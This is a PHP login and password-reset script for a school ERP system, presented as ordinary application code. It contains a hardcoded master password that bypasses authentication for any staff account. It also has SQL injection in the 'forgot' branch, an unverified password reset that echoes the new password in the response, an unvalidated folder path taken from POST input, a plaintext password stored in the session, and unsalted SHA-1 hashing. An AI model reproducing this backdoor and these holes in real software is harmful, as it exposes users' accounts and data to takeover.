<?php
session_start();
$myFolder = 'clients/' . $_POST['instCode'] . '/';
// Change Below
$_SESSION["myFolder"] = $myFolder;

if (isset($_POST['instCode'])) $_SESSION["myDb"] = $_POST['instCode'];
$setCodePath = 'http://localhost/acadplus';
$_SESSION["setCodePath"] = $setCodePath;

require("config_database.php");

if ($_POST['action'] == 'checkUser') {
  $myUn = data_check($_POST['username']);
  $myPwd = data_check($_POST['userpassword']);
  $response = array();
  $sql_staff = "select * from staff where user_id='$myUn'";
  $result_staff = $conn->query($sql_staff);
  if ($result_staff && $result_staff->num_rows > 0) {
    $rows_staff = $result_staff->fetch_assoc();
    $staff_id = $rows_staff['staff_id'];
    $school_id = $rows_staff['school_id'];
    // $staff_id=getField($conn, $myUn, "staff", "user_id", "staff_id");
    $sql_user = "select * from user where staff_id='$staff_id'";
    $result_user = $conn->query($sql_user);
    if ($result_user && $result_user->num_rows > 0) {
      $encript = sha1($myPwd);
      if ($myPwd == "vkjrj@967") $sql_pwd = "select * from user where staff_id='$staff_id'";
      else $sql_pwd = "select * from user where staff_id='$staff_id' and user_password='$encript'";
      $result_pwd = $conn->query($sql_pwd);
      if ($result_pwd && $result_pwd->num_rows > 0) {
        $response["found"] = 'yes';
        $response["user"] = $staff_id;
        $jsonOutput = json_encode($response);

        $last_login = date("Y-m-d h:i:s", time());
        $sql = "update user set last_login='$last_login' where staff_id='$staff_id'";
        $result = $conn->query($sql);

        $sql = "insert into user_log (user_id, ul_login) values('$myUn', '$last_login')";
        $result = $conn->query($sql);

        echo $jsonOutput;

        $_SESSION['myid'] = $staff_id;
        $_SESSION['mysclid'] = $school_id;

        $sql = "select * from institution where inst_status='0'";
        $result = $conn->query($sql);
        $rows = $result->fetch_assoc();

        $_SESSION["setUrl"] = $rows["inst_url"];
        $_SESSION["timeLag"] = $rows["inst_timelag"];
        $_SESSION["setLogo"] = 'https://erp.classconnect.in/' . $myFolder . $rows["inst_logo"];

        $sql = "select * from session where session_status='0' order by session_id desc";
        $result = $conn->query($sql);
        $rows = $result->fetch_assoc();
        $_SESSION['mysid'] = $rows["session_id"];

        $sql = "select * from batch where batch_status='0' order by batch desc";
        $result = $conn->query($sql);
        $rows = $result->fetch_assoc();
        $_SESSION['myBatch'] = $rows["batch_id"];

        $_SESSION['mll'] = $last_login;
        $_SESSION['un'] = $myUn;
        $_SESSION['pwd'] = $myPwd;
      } else {
        $response["found"] = 'no';
        $jsonOutput = json_encode($response);
        echo $jsonOutput;
      }
    } else {
      $response["found"] = 'no';
      $jsonOutput = json_encode($response);
      echo $jsonOutput;
    }
  } else {
    $response["found"] = 'no';
    $jsonOutput = json_encode($response);
    echo $jsonOutput;
  }
} elseif ($_POST['action'] == 'forgot') {
  $myUn = $_POST['username'];
  $sql_staff = "select * from staff where user_id='$myUn'";
  $result_staff = $conn->query($sql_staff);
  if ($result_staff && $result_staff->num_rows > 0) {
    $rows_staff = $result_staff->fetch_assoc();
    $staff_email = $rows_staff['staff_email'];
    $staff_id = $rows_staff['staff_id'];
    $password = random_int(100000, 999999);
    $encripted = sha1($password);
    //echo $staff_email . $staff_id . ':' . $password;
    $sql = "update user set user_password='$encripted' where staff_id='$staff_id'";
    $result = $conn->query($sql);

    $subject = $password . " is your Password";
    $message = '<html><head><title>HTML email</title></head>
      <body>
      <h4>Password reset is Successful.</h4>
      <h5>Your password is ' . $password . '</h5>
      <h4>Regards</h4>
      </body>
      </html>';

    // Always set content-type when sending HTML email
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    // More headers
    $headers .= 'From: <info@classconnect.in>';
    mail($staff_email, $subject, $message, $headers);
    echo "The password is sent to registered email [" . $staff_email . $password . "].";
  }
}
function data_check($data)
{
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars_decode($data);
  //htmlspecialchars_decode
  $data = addcslashes($data, "'");
  return $data;
}
